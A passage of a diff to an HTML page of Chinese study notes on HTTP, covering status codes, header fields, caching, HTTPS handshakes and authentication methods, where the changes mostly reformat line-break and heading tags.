-<code>Range：bytes=5001-10000</code> * 从5001字节之后全部的<br>
+* 5001~10000字节<br />
+<code>Range：bytes=5001-10000</code> * 从5001字节之后全部的<br />
 <code>Range：bytes=5001-</code> *
-从一开始到3000字节和5000~7000字节的多重范围<br>
+从一开始到3000字节和5000~7000字节的多重范围<br />
 <code>Range：bytes=-3000，5000，7000</code></p>
 <p>针对范围请求，响应会返回状态码为206 Partial
-Content的响应请求报文。另外，对于多重范围的范围请求，响应会在首部字段Content-Type标明multipart/byteranges后返回响应报文。<br>
+Content的响应请求报文。另外，对于多重范围的范围请求，响应会在首部字段Content-Type标明multipart/byteranges后返回响应报文。<br />
 如果服务器端无法响应范围请求，则会返回状态码200 OK和完整的实体内容。</p>
 <h2 id="内容协商返回最合适的内容">内容协商返回最合适的内容</h2>
 <p>内容协商机制是指客户端和服务器端就响应的资源内容进行交涉，然后提供给客户端最为适合的资源。内容协商会以响应资源的语言、字符集、编码方式等作为判断的基准。包含在请求报文中的某些首部字段（如下）就是判断的基准。
 * Accept * Accept-Charset * Accept-Encoding * Accept-Language *
 Content-Language</p>
 <p>内容协商技术有以下三种类型 * 服务器驱动协商（Server-driven
-Negotiation）<br>
+Negotiation）<br />
 由服务器端进行内容协商。以请求的首部字段为参考，在服务端自动处理 *
-客户端驱动协商（Agent-driven Negotiation）<br>
+客户端驱动协商（Agent-driven Negotiation）<br />
 由客户端进行内容协商的方式。用户从浏览器显示的可选项列表中手动选择。还可以利用JavaScript脚本在Web页面上自动进行上述选择。
-* 透明协商（Transparent Negotiation）<br>
+* 透明协商（Transparent Negotiation）<br />
 是服务器驱动和客户端驱动的结合体，是由服务器端和客户端各自进行内容协商的一种办法。</p>
 <h1 id="返回结果的http状态码">返回结果的HTTP状态码</h1>
 <table>
@@ -1081,84 +1366,86 @@ Negotiation）<br>
 </tbody>
 </table>
 <h2 id="xx成功">2XX成功</h2>
-<p>2XX的响应结果表明请求被正常处理了。 * 200 OK<br>
-表示从客户端发来的请求在服务器端被正常处理了。 * 204 No Content<br>
+<p>2XX的响应结果表明请求被正常处理了。 * 200 OK<br />
+表示从客户端发来的请求在服务器端被正常处理了。 * 204 No Content<br />
 该状态码代表服务器接收的请求已成功处理，但在返回的响应报文中不含实体的主体成分。
-* 206 Partial Content<br>
+* 206 Partial Content<br />
 该状态码表示客户端进行了范围请求，而服务器成功执行了这部分的GET请求。响应报文中包含由Content-Range指定范围的实体内容</p>
 <h2 id="xx重定向">3XX重定向</h2>
 <p>3XX响应结果表明浏览器需要执行某些特殊的处理以正确处理请求。 * 301
-Moved Permanently<br>
+Moved Permanently<br />
 永久性重定向。该状态码表示请求的资源已被分配了新的URI，以后应使用资源现在所指的URI
-* 302 Found<br>
+* 302 Found<br />
 临时性重定向。该状态码表示请求的资源已被分配了新的URI，希望用户（本次）能使用新的URI访问。
-* 303 See Other<br>
+* 303 See Other<br />
 该状态码表示由于对应的资源存在另一个URI，应使用GET方法定向获取请求的资源。
-* 304 Not Modidied<br>
+* 304 Not Modidied<br />
 该状态码表示客户端发送附带条件的请求时，服务器端允许请求访问资源，但因发生请求未满足条件的情况后，直接返回304
 Not
 Modified（服务器端资源未改变，可直接使用客户端未过期的缓存）。304虽然被划分在3XX类别中，但是和重定向没有关系。
-* 307 Temporary Redirect<br>
+* 307 Temporary Redirect<br />
 临时重定向。该状态码与302
 Found有着相同的含义。尽管302标准禁止POST变换成GET，但实际使用时大家并不遵守。307会遵照浏览器标准，不会从POST变成GET。</p>
 <h2 id="xx客户端错误">4XX客户端错误</h2>
-<p>4XX的响应结果表明客户端是发生错误的原因所在。 * 400 Bad Requset<br>
+<p>4XX的响应结果表明客户端是发生错误的原因所在。 * 400 Bad Requset<br />
 该状态码表示请求报文中存在语法错误。当错误发生时，需修改请求的内容后再次发送请求。另外，浏览器会像200
 OK一样对待该状态码。 * 401 Unauthorized
-该状态码表示发送的请求需要有通过HTTP认证（BASIC认证、DIGEST认证）的认证信息。另外若之前已进行过1次请求，则表示用户认证失败。<br>
+该状态码表示发送的请求需要有通过HTTP认证（BASIC认证、DIGEST认证）的认证信息。另外若之前已进行过1次请求，则表示用户认证失败。<br />
 返回含有401响应必须包含一个适用于被请求资源的WWW-Authenticate首部用以质询（challenge）用户信息。当浏览器初次接收到401响应，会弹出认证用的对话窗口。
-* 403 Forbidden<br>
+* 403 Forbidden<br />
 该状态码表明对请求资源的访问被服务器拒绝了。未获得文件系统的访问授权，访问授权出现某些问题（从未授权的发送源IP地址试图访问）等列举的情况都可能是发生403的原因。
-* 404 Not Found<br>
+* 404 Not Found<br />
 该状态码表明服务器上无法找到请求的资源。除此之外，也可以在服务器端拒绝请求且不想说明理由时使用。</p>
 <h2 id="xx服务器错误">5XX服务器错误</h2>
 <p>5XX的响应结果表明服务器本身发生错误。 * 500 Internal Server
-Error<br>
+Error<br />
 该状态码表明服务器端在执行请求时发生了错误。也有可能是Web应用存在的bug或某些临时的故障。
-* 503 Server unavailable<br>
+* 503 Server unavailable<br />
 该状态码表明服务器暂时处于超负荷或正在进行停机维护，现在无法处理请求。</p>
 <h1 id="与http协作的web服务器">与HTTP协作的Web服务器</h1>
 <h2 id="用单台虚拟主机实现多个域名">用单台虚拟主机实现多个域名</h2>
-<p>HTTP/1.1规范允许一台HTTP服务器搭建多个Web站点。<br>
+<p>HTTP/1.1规范允许一台HTTP服务器搭建多个Web站点。<br />
 在互联网上，域名通过DNS服务器映射到IP地址（域名解析）之后访问目标网站。可见，当请求发送到服务器时，已经是以IP地址形式访问了。在相同的IP地址下，由于虚拟主机可以寄存多个不同主机名和域名的Web网站，因此在发送HTTP请求时，必须在Host首部内完整指定主机名或域名的URI。</p>
-<h2 id="通信数据转发程序代理网关隧道">通信数据转发程序：代理、网关、隧道</h2>
+<h2
+id="通信数据转发程序代理网关隧道">通信数据转发程序：代理、网关、隧道</h2>
 <h3 id="代理">代理</h3>
-<p>代理是一种有转发功能的应用程序，它扮演了位于服务器和客户端“中间人”的角色，接收由客户端发送的请求并转发给服务器，同时也接收服务器返回的响应并转发给客户端。<br>
-* 缓存代理<br>
+<p>代理是一种有转发功能的应用程序，它扮演了位于服务器和客户端“中间人”的角色，接收由客户端发送的请求并转发给服务器，同时也接收服务器返回的响应并转发给客户端。<br />
+* 缓存代理<br />
 代理转发响应时，缓存代理（Caching
 Proxy）会预先将资源的副本（缓存）保存在代理服务器上。当代理再次接到对相同资源的请求时，就可以不从源服务器那里获取资源，而是将之前缓存的资源作为响应返回。
-* 透明代理<br>
+* 透明代理<br />
 转发请求或响应时，不对报文做任何加工的代理类型被称作透明代理（Transparent
 Proxy）。反之，对报文内容进行加工的代理被称为非透明代理。</p>
 <h3 id="网关">网关</h3>
 <p>网关的工作机制和代理十分相似。而网关能使通信线路上的服务器提供非HTTP协议服务。利用网关能提高通信的安全性，因为可以在客户端与网关之间的通信线路上加密以确保连接的安全。比如，网关可以连接数据库，使用SQL语句查询数据。另外，在Web购物网站上进行信用卡结算时，网关可以和信用卡结算系统联动。</p>
 <h3 id="隧道">隧道</h3>
-<p>隧道可按要求建立起一条与其他服务器的通信线路，届时使用SSL等加密手段进行通信。隧道的目的是确保客户端能与服务器进行安全的通信。<br>
+<p>隧道可按要求建立起一条与其他服务器的通信线路，届时使用SSL等加密手段进行通信。隧道的目的是确保客户端能与服务器进行安全的通信。<br />
 隧道本身不会去解析HTTP请求。也就是说，请求保持原样中转给之后的服务器。隧道会在通信双方断开连接时结束。</p>
 <h1 id="http首部">HTTP首部</h1>
 <h2 id="http报文首部">HTTP报文首部</h2>
-<p>在请求中，HTTP报文由方法、URI、HTTP版本、HTTP首部字段等部分构成。<br>
+<p>在请求中，HTTP报文由方法、URI、HTTP版本、HTTP首部字段等部分构成。<br />
 在响应中，HTTP报文由HTTP版本、状态码（数字和原因短语）、HTTP首部字段3部分构成。</p>
 <h2 id="http首部字段">HTTP首部字段</h2>
 <h3 id="http首部字段结构">HTTP首部字段结构</h3>
-<p>HTTP首部字段是由首部字段名和字段值构成的，中间用冒号“：”分隔<br>
-<code>首部字段名:字段值</code><br>
-另外，单个HTTP首部字段可以有多个值，如下所示：<br>
+<p>HTTP首部字段是由首部字段名和字段值构成的，中间用冒号“：”分隔<br />
+<code>首部字段名:字段值</code><br />
+另外，单个HTTP首部字段可以有多个值，如下所示：<br />
 <code>Keep-Alive:timeout=15,max=100</code></p>
 <h3 id="http首部字段类型">HTTP首部字段类型</h3>
 <ul>
-<li>通用首部字段<br>
+<li>通用首部字段<br />
 请求包围和响应报文两方都会使用的首部。</li>
-<li>请求首部字段<br>
+<li>请求首部字段<br />
 从客户端向服务器端发送请求报文时使用的首部。补充了请求的附加内容、客户端信息、响应内容相关优先级等信息。</li>
-<li>响应首部字段<br>
+<li>响应首部字段<br />
 从服务器向客户端返回响应报文时使用的首部。补充了响应的附加内容，也会要求客户端附加额外的内容信息。</li>
-<li>实体首部字段<br>
+<li>实体首部字段<br />
 针对请求报文和响应报文的实体部分使用的首部。补充了资源内容和更新时间等与实体有关的信息。</li>
 </ul>
-<h3 id="end-to-end首部和hop-by-hop首部">End-to-end首部和Hop-by-hop首部</h3>
+<h3
+id="end-to-end首部和hop-by-hop首部">End-to-end首部和Hop-by-hop首部</h3>
 <ul>
-<li>端到端首部（End-to-end Header）<br>
+<li>端到端首部（End-to-end Header）<br />
 分在此类别中的首部会转发给请求/响应对应的最终接收目标，且必须保存在由缓存生成的响应中，另外规定它必须被转发。</li>
 <li>逐跳首部（Hop-by-hop Header）
 分在此类中的首部只对单词转发有效，会因通过缓存或代理而不再转发。HTTP/1.1和之后版本中，如果要使用hop-by-hop首部，需提供Connection首部字段。
@@ -1176,61 +1463,61 @@ Proxy）。反之，对报文内容进行加工的代理被称为非透明代理
 <h2 id="通用首部字段">通用首部字段</h2>
 <h3 id="cache-control">Cache-Control</h3>
 <p>通过指定首部字段Cache-Control的指令，就能操作缓存的工作机制。 &gt;
-表示是否能缓存的指令 * public<br>
+表示是否能缓存的指令 * public<br />
 当指定使用public指令时，则明确表明其他用户也可利用缓存。 * private
 当指定private指令后，响应只以特定的用户作为对象，这与public指令的行为相反。缓存服务器会对该特定用户提供资源缓存的服务，对于其他用户发送过来的请求，代理服务器则不会返回缓存。
 * no-cache
 使用no-cache指令的目的是为了防止从缓存中返回过期的资源。客户端发送的请求中如果包含no-cache指令，则表示客户端将不会接收缓存过的响应。于是，“中间”的缓存服务器必须把客户端请求转发给源服务器。如果服务器返回的响应中包含no-cache指令，那么缓存服务器不能对资源进行缓存。源服务器以后也不再对缓存服务器请求中提出的资源有效性进行确认，且禁止其对响应资源进行缓存操作。
-&gt; 控制可执行缓存的对象的指令 * no-store<br>
+&gt; 控制可执行缓存的对象的指令 * no-store<br />
 当使用no-store指令时，暗示请求（和对应的响应）或响应中包含机密信息。因此，该指令规定缓存不能再本地存储请求或响应的任一部分。
-&gt; 指定缓存期限和认证的指令。 * s-maxage<br>
-<code>s-maxage=604800(单位：秒)</code><br>
+&gt; 指定缓存期限和认证的指令。 * s-maxage<br />
+<code>s-maxage=604800(单位：秒)</code><br />
 s-maxage指令的功能和max-age指令的相同，他们的不同点是s-maxage指令只适用于供多位用户使用的公共缓存服务器。另外，当使用s-maxage指令后，则直接忽略对Expires首部字段及max-age指令的处理。
-* max-age<br>
-<code>max-age=604800(单位：秒)</code><br>
+* max-age<br />
+<code>max-age=604800(单位：秒)</code><br />
 当客户端发送的请求中包含max-age指令时，如果判定缓存资源的缓存时间数值比指定时间的数值更小，那么客户端就接收缓存的资源。
-* min-fresh<br>
-<code>min-fresh=60(单位：秒)</code><br>
+* min-fresh<br />
+<code>min-fresh=60(单位：秒)</code><br />
 min-fresh指令要求缓存服务器返回至少还未过指定时间的缓存资源。 *
-max-stale<br>
-<code>max-stale=3600(单位：秒)</code><br>
+max-stale<br />
+<code>max-stale=3600(单位：秒)</code><br />
 使用max-stale可指示缓存资源，即使过期也照常接收。如果未指定参数值，那么无论过多久，客户端都会接收响应；如果指令中指定了具体数值，那么即使过期，只要仍处于max-stale指定的时间内，仍旧会被客户端接收。
-* only-if-cached<br>
+* only-if-cached<br />
 表示客户端仅在缓存服务器本地缓存目标资源的情况下才会要求其返回。若发生请求缓存服务器的本地缓存无响应，则返回状态码504
-Gateway Timeout * must-revalidate<br>
+Gateway Timeout * must-revalidate<br />
 代理会向源服务器再次验证即将返回的响应缓存目前是否仍然有效。另外，使用must-revalidate指令会忽略请求的max-stale指令。
-* proxy-revalidate<br>
+* proxy-revalidate<br />
 要求所有的缓存服务器在接收到客户端带有该指令的请求返回响应之前，必须再次验证缓存的有效性。
-* no-transform<br>
+* no-transform<br />
 规定无论是在请求还是响应中，缓存都不能改变实体主体的媒体类型。防止缓存或代理压缩图片等类似操作。</p>
 <h3 id="connection">Connection</h3>
 <ul>
-<li>控制不再转发给代理的首部字段<br>
-<code>Connection:不再转发的首部字段名</code><br>
+<li>控制不再转发给代理的首部字段<br />
+<code>Connection:不再转发的首部字段名</code><br />
 即（Hop-by-hop首部）</li>
-<li>管理持久连接<br>
-HTTP/1.1版本的默认连接都是持久连接。当服务器端想明确断开连接时，则指定Connection首部字段的值为Close。<br>
+<li>管理持久连接<br />
+HTTP/1.1版本的默认连接都是持久连接。当服务器端想明确断开连接时，则指定Connection首部字段的值为Close。<br />
 HTTP/1.1之前的版本的默认连接都是非持久连接。为此，如果想在旧版本的HTTP协议上维持持续连接。则需要指定Connection首部字段的值为Keep-Alive。</li>
 </ul>
 <h3 id="date">Date</h3>
 <p>表明创建HTTP报文的日期和时间</p>
 <h3 id="pragma">Pragma</h3>
-<p>Pragma是HTTP/1.1之前版本的历史遗留字段，仅作为与HTTP/1.0的向后兼容而定义。规范定义的形式唯一，如下所示：<br>
-<code>Pragma:no-cache</code><br>
+<p>Pragma是HTTP/1.1之前版本的历史遗留字段，仅作为与HTTP/1.0的向后兼容而定义。规范定义的形式唯一，如下所示：<br />
+<code>Pragma:no-cache</code><br />
 该首部字段属于通用首部字段，但只用在客户端发送的请求中。客户端会要求所有的中间服务器不返回缓存的资源。</p>
 <h3 id="trailer">Trailer</h3>
 <p>首部字段Trailer会事先说明在报文主体后记录了哪些首部字段。</p>
 <h3 id="transfer-encoding">Transfer-Encoding</h3>
 <p>规定了传输报文主体时采用的编码方式。</p>
 <h3 id="upgrade">Upgrade</h3>
-<p>用于检测HTTP协议及其他协议是否可以使用更高的版本进行通信。<br>
+<p>用于检测HTTP协议及其他协议是否可以使用更高的版本进行通信。<br />
 <code>Upgrade: TLS/1.0</code></p>
 <h3 id="via">Via</h3>
-<p>为了追踪客户端与服务器之间的请求和响应报文的传输路径。<br>
+<p>为了追踪客户端与服务器之间的请求和响应报文的传输路径。<br />
 报文经过代理或网关时，会先在首部字段Via中附加该服务器的信息，然后再进行转发。</p>
 <h3 id="warning">Warning</h3>
-<p>告知用户一些与缓存相关的问题的警告。格式如下，最后的日期时间可省略。<br>
-<code>Warning:[警告码][警告的主机：端口号]"[警告内容]"([日期时间])</code><br>
+<p>告知用户一些与缓存相关的问题的警告。格式如下，最后的日期时间可省略。<br />
+<code>Warning:[警告码][警告的主机：端口号]"[警告内容]"([日期时间])</code><br />
 |警告码|警告内容|说明| |------|-------|----| |110|Response is
 stale(响应已过期)|代理返回已过期的资源| |111|Revalidation
 failed（再验证失败）|代理再验证资源有效性时失败（服务器无法到达等原因）|
@@ -1244,8 +1531,8 @@ applied（使用了转换）|代理对内容编码或媒体类型执行了某些
 warning（持久杂项警告）|任意的警告内容|</p>
 <h2 id="请求首部字段">请求首部字段</h2>
 <h3 id="accept">Accept</h3>
-<p>通知服务器，用户代理能够处理的媒体类型及媒体类型的优先级。<br>
-<code>资源类型/资源格式 q=</code><br>
+<p>通知服务器，用户代理能够处理的媒体类型及媒体类型的优先级。<br />
+<code>资源类型/资源格式 q=</code><br />
 权重值q的范围是0~1。当服务器提供多种内容时，将会优先返回权重值最高的媒体类型。</p>
 <h3 id="accept-charset">Accept-Charset</h3>
 <p>通知服务器用户代理支持的字符集及字符集的相对优先顺序。该首部字段应用于内容协商机制的服务器驱动协商。</p>
@@ -1258,7 +1545,7 @@ warning（持久杂项警告）|任意的警告内容|</p>
 <h3 id="host">Host</h3>
 <p>告知服务器请求的资源所处的互联网主机名和端口号。Host首部字段在HTTP/1.1规范内是唯一一个必须被包含在请求内的首部字段。</p>
 <h3 id="if-match">If-Match</h3>
-<p>形如If-xxx这种样式的请求字段首部，都可称为条件请求。服务器接收到附带条件的请求后，只有判断指定条件为真时，才会执行请求。<br>
+<p>形如If-xxx这种样式的请求字段首部，都可称为条件请求。服务器接收到附带条件的请求后，只有判断指定条件为真时，才会执行请求。<br />
 服务器会比对If-Match的字段值和资源的ETag值，仅当两者一致时，才会执行请求，反之，则返回状态码412
 Precondition Failed的响应。</p>
 <h3 id="if-modified-since">If-Modified-Since</h3>
@@ -1287,7 +1574,7 @@ Not Modified的响应。</p>
 <p>告知客户端，源服务器在多久前创建了响应。若创建该响应的是缓存服务器，Age值是指缓存后的响应再次发起认证到认证完成的时间值。代理创建响应式必须加上首部字段Age。</p>
 <h3 id="etag">ETag</h3>
 <p>告知客户端实体标识。它是一种可将资源以字符串形式做唯一性标识的方式。服务器会为每份资源分配对应的ETag值。另外，当资源更新时，ETag值也需要更新。若在下载过程中出现连接中断、再连接的情况，都会依照ETag值来指定资源。
-* 强ETag值<br>
+* 强ETag值<br />
 不论实体发生多么细微的变化都会改变其值。 * 弱ETag值
 弱ETag值只用于提示资源是否相同。只有资源发生了根本改变，产生差异时才会改变ETag值。这时，会在字段值最开始处附加W/。</p>
 <h3 id="location">Location</h3>
@@ -1318,7 +1605,7 @@ Allowed作为响应返回。与此同时，还会把所有能支持的HTTP方法
 <h3 id="content-range">Content-Range</h3>
 <p>针对范围请求，返回响应式使用的首部字段Content-Range，能告知客户端作为响应返回的实体的哪个部分符合范围请求。字段值以字节为单位，表示当前发送部分及整个实体大小。</p>
 <h3 id="content-type">Content-Type</h3>
-<p><code>Content-Type: text/html; charset=UTF-8</code><br>
+<p><code>Content-Type: text/html; charset=UTF-8</code><br />
 首部字段Content-Type说明了实体主体内对象的媒体类型。和首部字段Accept一样，字段值用type/subtype形式赋值。参数charset使用字符集进行赋值。</p>
 <h3 id="expires">Expires</h3>
 <p>会将资源失效的日期告知客户端。缓存服务器再接收到含有首部字段Expires的响应后，会以缓存来应答请求，在Expires字段指定的时间之前，响应的副本会一直被保存。</p>
@@ -1328,8 +1615,8 @@ Allowed作为响应返回。与此同时，还会把所有能支持的HTTP方法
 <h3 id="set-cookie">Set-Cookie</h3>
 <table>
 <colgroup>
-<col style="width: 42%">
-<col style="width: 57%">
+<col style="width: 42%" />
+<col style="width: 57%" />
 </colgroup>
 <thead>
 <tr class="header">
@@ -1365,7 +1652,7 @@ Allowed作为响应返回。与此同时，还会把所有能支持的HTTP方法
 </tbody>
 </table>
 <h3 id="cookie">Cookie</h3>
-<p><code>Cookie: status=enable</code><br>
+<p><code>Cookie: status=enable</code><br />
 告知服务器，当客户端想获得HTTP状态管理支持时，就会在请求中包含从服务器接收到的Cookie。</p>
 <h2 id="其他首部字段">其他首部字段</h2>
 <h3 id="x-frame-options">X-Frame-Options</h3>
@@ -1387,88 +1674,90 @@ Track的简称，意为拒绝个人信息被收集，是表示拒绝被精准广
 </ul>
 <h3 id="加密处理防止被窃听">加密处理防止被窃听</h3>
 <blockquote>
-<p>通信的加密<br>
+<p>通信的加密<br />
 HTTP协议中没有加密机制，但可以通过和SSL或TLS的组合使用，加密HTTP的通信内容。用SSL建立安全通信线路之后，就可以在这条线路上进行HTTP通信了。与SSL组合使用的HTTP被称为HTTPS（HTTP
 Secure，超文本传输安全协议）或HTTP over SSL。</p>
 </blockquote>
 <blockquote>
-<p>内容的加密<br>
+<p>内容的加密<br />
 由于HTTP协议中没有加密机制，那么就对HTTP协议传输的内容本身加密。即把HTTP报文里所含的内容进行加密处理。</p>
 </blockquote>
-<h3 id="不验证通信方的身份就可能遭遇伪装">不验证通信方的身份就可能遭遇伪装</h3>
+<h3
+id="不验证通信方的身份就可能遭遇伪装">不验证通信方的身份就可能遭遇伪装</h3>
 <blockquote>
-<p>查明对手的的证书<br>
+<p>查明对手的的证书<br />
 SSL不仅提供加密处理，而且还使用了一种被称为证书的手段，可用于确定方。</p>
 </blockquote>
 <blockquote>
-<p>如何防止篡改<br>
+<p>如何防止篡改<br />
 常用的是MD5和SHA-1等散列值校验的方法，以及用来确认文件的数字签名方法。</p>
 </blockquote>
-<h2 id="http加密认证完整性保护https"><strong><em>HTTP+加密+认证+完整性保护=HTTPS</em></strong></h2>
-<p>加密和解密同用一个密钥的方式称为共享密钥加密，也被叫做对称密钥加密。<br>
+<h2
+id="http加密认证完整性保护https"><strong><em>HTTP+加密+认证+完整性保护=HTTPS</em></strong></h2>
+<p>加密和解密同用一个密钥的方式称为共享密钥加密，也被叫做对称密钥加密。<br />
 公开密钥加密使用一堆非对称的密钥。一把叫做私有密钥，另一把叫做公开密钥。发送密文的乙方使用对方的公开密钥进行加密处理，对方收到被加密的信息后，再使用自己的私有密钥进行解密。</p>
 <h3 id="http采用混合加密机制"><strong>HTTP采用混合加密机制</strong></h3>
 <p>在交换密钥阶段使用公开密钥加密方式，之后的建立通信交换报文阶段则使用共享密钥加密方式。</p>
 <h3 id="证明公开密钥正确性的证书">证明公开密钥正确性的证书</h3>
-<p>数字证书认证机构处于客户端和服务器双方都可信赖的第三方机构的立场上。<br>
-首先，服务器的运营运营人员向数字证书认证机构提出公开密钥的申请。数字认证机构在判明申请者的身份之后，会对已申请的公开密钥做数字签名，然后分配这个已签名的公开密钥，并将该公开密钥放入公钥证书后绑定在一起。服务器会将这份由数字证书认证机构颁发的公钥证书发送给客户端。以进行公开密钥加密方式通信。接到证书的客户端可使用数字证书认证机构的公开密钥，对那张证书上的数字签名进行验证。<br>
+<p>数字证书认证机构处于客户端和服务器双方都可信赖的第三方机构的立场上。<br />
+首先，服务器的运营运营人员向数字证书认证机构提出公开密钥的申请。数字认证机构在判明申请者的身份之后，会对已申请的公开密钥做数字签名，然后分配这个已签名的公开密钥，并将该公开密钥放入公钥证书后绑定在一起。服务器会将这份由数字证书认证机构颁发的公钥证书发送给客户端。以进行公开密钥加密方式通信。接到证书的客户端可使用数字证书认证机构的公开密钥，对那张证书上的数字签名进行验证。<br />
 此处认证机关的公开密钥必须安全地交给客户端。因此，多数浏览器开发商发布版本时，会事先在内部植入常用认证机关的公开密钥。</p>
 <h3 id="可证明组织真实性的ev-ssl证书">可证明组织真实性的EV SSL证书</h3>
 <p>EV
 SSL证书时基于国际标准的认证指导方针办法的证书。其严格规定了对运营组织是否真实的确认方针，因此，通过认证的Web网站能够获得更高的认可度。</p>
 <h3 id="用以确认客户端的客户端证书">用以确认客户端的客户端证书</h3>
-<p>以客户端证书进行客户端认证，证明服务器正在通信的对方始终时预料之内的客户端，其作用跟服务器证书如出一辙。<br>
+<p>以客户端证书进行客户端认证，证明服务器正在通信的对方始终时预料之内的客户端，其作用跟服务器证书如出一辙。<br />
 客户端证书存在的另一个问题点是，客户端证书毕竟只能用来证明客户端实际存在，而不能用来证明用户本人的真实有效性。也就是说，只要获得了安装有客户端证书的计算机的使用权限，也就意味着同时拥有了客户端证书的使用权限。</p>
 <h3 id="认证机构信誉第一">认证机构信誉第一</h3>
 <p>SSL机制中接入认证机构之所以可行，是因为建立在其信用绝对可靠这一大前提下的。</p>
 <p>由自认证机构颁发的证书称为自签名证书</p>
 <h3 id="https的安全通信机制">HTTPS的安全通信机制</h3>
 <p>步骤1：客户端通过发送Client
-Hello报文开始SSL通信。报文中包含客户端支持的SSL的指定版本、加密组件（cipher）列表（所使用的加密算法及密钥长度等）。<br>
+Hello报文开始SSL通信。报文中包含客户端支持的SSL的指定版本、加密组件（cipher）列表（所使用的加密算法及密钥长度等）。<br />
 步骤2：服务器可进行SSL通信时，会以Server
-Hello报文作为应答。和客户端一样，在报文中包含SSL版本以及加密组件。服务器的加密组件内容是从接收到的客户端加密组件内筛选出来的。<br>
-步骤3：之后服务器发送Certificate报文。报文中包含公开密钥证书。<br>
+Hello报文作为应答。和客户端一样，在报文中包含SSL版本以及加密组件。服务器的加密组件内容是从接收到的客户端加密组件内筛选出来的。<br />
+步骤3：之后服务器发送Certificate报文。报文中包含公开密钥证书。<br />
 步骤4：最后服务器发送Server Hello
-Done报文通知客户端，最初阶段的SSL握手协商部分结束。<br>
+Done报文通知客户端，最初阶段的SSL握手协商部分结束。<br />
 步骤5：SSL第一次握手结束之后，客户端以Client Key
 Exchange报文作为回应。报文中包含通信加密中使用的一种被称为Pre-master
-secret的随机密码串。该报文已用步骤3中的公开密钥进行加密。<br>
+secret的随机密码串。该报文已用步骤3中的公开密钥进行加密。<br />
 步骤6：接着客户端继续发送Change Cipher
 Spec报文。该报文会提示服务器，在此报文之后的通信会采用Pre-master
-secret密钥加密。<br>
-步骤7：客户端发送Finished报文。该报文包含连接至今全部报文的整体校验值。这次握手协商是否能够成功，要以服务器是否能够正确解密该报文作为判定标准。<br>
-步骤8：服务器同样发送Change Cipher Spec报文<br>
-步骤9： 服务器同样发送Finished报文。<br>
-步骤10：服务器和客户端的Finished报文交换完毕之后，SSL连接就算建立完成。从此处开始进行应用层协议的通信，即发送HTTP请求。<br>
-步骤11：应用层协议通信，即发送HTTP响应。<br>
+secret密钥加密。<br />
+步骤7：客户端发送Finished报文。该报文包含连接至今全部报文的整体校验值。这次握手协商是否能够成功，要以服务器是否能够正确解密该报文作为判定标准。<br />
+步骤8：服务器同样发送Change Cipher Spec报文<br />
+步骤9： 服务器同样发送Finished报文。<br />
+步骤10：服务器和客户端的Finished报文交换完毕之后，SSL连接就算建立完成。从此处开始进行应用层协议的通信，即发送HTTP请求。<br />
+步骤11：应用层协议通信，即发送HTTP响应。<br />
 步骤12：最后由客户端断开连接。断开连接时，发送close_notify报文。这步之后再发送TCP
 FIN报文来关闭与TCP的通信。</p>
 <h1 id="确认访问用户身份的认证">确认访问用户身份的认证</h1>
 <h2 id="basic认证">BASIC认证</h2>
 <p>步骤1：当请求的资源需要BASIC认证时，服务器会随状态码401 Authorization
-Required，返回带WWW-Authenticate首部字段的响应。该字段内包含认证的方式（BASIC）及Request-URI安全域字符串（realm）。<br>
+Required，返回带WWW-Authenticate首部字段的响应。该字段内包含认证的方式（BASIC）及Request-URI安全域字符串（realm）。<br />
 步骤2：
-接收到状态码401的客户端为了通过BASIC认证，需要将用户ID及密码发送给服务器。发送的字符串内容是由用户ID和密码构成，两者中间以冒号（：）连接后，再经过Base64编码处理。把这串字符串写入首部字段Authorization后，发送请求。<br>
+接收到状态码401的客户端为了通过BASIC认证，需要将用户ID及密码发送给服务器。发送的字符串内容是由用户ID和密码构成，两者中间以冒号（：）连接后，再经过Base64编码处理。把这串字符串写入首部字段Authorization后，发送请求。<br />
 步骤3：接收到包含首部字段Authorization请求的服务器，会对认证信息的正确性进行验证。如验证通过，则会返回一条包含Request-URI资源的响应。</p>
 <p>BASIC认证使用上不够便捷灵活，且达不到多数Web网站期望的安全性等级，因此它并不常用。</p>
 <h2 id="digest认证">DIGEST认证</h2>
 <p>步骤1：请求需认证的资源时，服务器会随着状态码401 Authorization
-Required，返回带WWW-Authenticate首部字段的响应。该字段内包含指纹响应方式认证所需的临时质询码（随机数，nonce）。<br>
-步骤2：接收到401状态码的客户端，返回的响应中包含DIGEST认证必须的首部字段Authorization信息，其中必须包含username、realm、nonce、uri和response的字段信息。其中，realm和nonce就是之前从服务器接收到的响应中的字段。response也可叫做Request-Digest，存放经过MD5运算后的密码字符串，形成响应码。<br>
+Required，返回带WWW-Authenticate首部字段的响应。该字段内包含指纹响应方式认证所需的临时质询码（随机数，nonce）。<br />
+步骤2：接收到401状态码的客户端，返回的响应中包含DIGEST认证必须的首部字段Authorization信息，其中必须包含username、realm、nonce、uri和response的字段信息。其中，realm和nonce就是之前从服务器接收到的响应中的字段。response也可叫做Request-Digest，存放经过MD5运算后的密码字符串，形成响应码。<br />
 步骤3：接收到包含首部字段Authorization请求的服务器，会确认认证信息的正确性。认证通过后则返回包含Request-URI资源的响应。并且这时会在首部字段Authentication-Info写入一些认证成功的相关信息。</p>
 <h2 id="ssl客户端认证">SSL客户端认证</h2>
-<p>为达到SSL客户端认证的目的，需要实现将客户端证书分发给哭护短，且客户端必须安装此证书。<br>
+<p>为达到SSL客户端认证的目的，需要实现将客户端证书分发给哭护短，且客户端必须安装此证书。<br />
 步骤1：接收到需要认证资源的请求，服务器会发送Certificate
-Request报文，要求客户端提供客户端证书。<br>
+Request报文，要求客户端提供客户端证书。<br />
 步骤2：用户选择将发送的客户端证书后，客户端会把客户端证书信息以Client
-Certificate报文方式发送给服务器。<br>
+Certificate报文方式发送给服务器。<br />
 步骤3：服务器验证客户端证书，验证通过后方可领取证书内客户端的公开密钥，然后开始HTTPS加密通信。</p>
 <h2 id="表单认证">表单认证</h2>
-<p>客户端会向服务器上的Web应用程序发送登录信息（Credential），按登录信息的验证结果认证。基于表单认证的标准规范尚未有定论，一般会使用Cookie来管理Session（会话）。<br>
-步骤1：客户端把用户ID和密码等登录信息放入报文的实体部分，通常是以POST方法把请求发送给服务器。而这时，会使用HTTPS通信来进行HTML表单画面的显示和用户输入数据的发送。<br>
+<p>客户端会向服务器上的Web应用程序发送登录信息（Credential），按登录信息的验证结果认证。基于表单认证的标准规范尚未有定论，一般会使用Cookie来管理Session（会话）。<br />
+步骤1：客户端把用户ID和密码等登录信息放入报文的实体部分，通常是以POST方法把请求发送给服务器。而这时，会使用HTTPS通信来进行HTML表单画面的显示和用户输入数据的发送。<br />
 步骤2：服务器会发放用以识别用户的Session
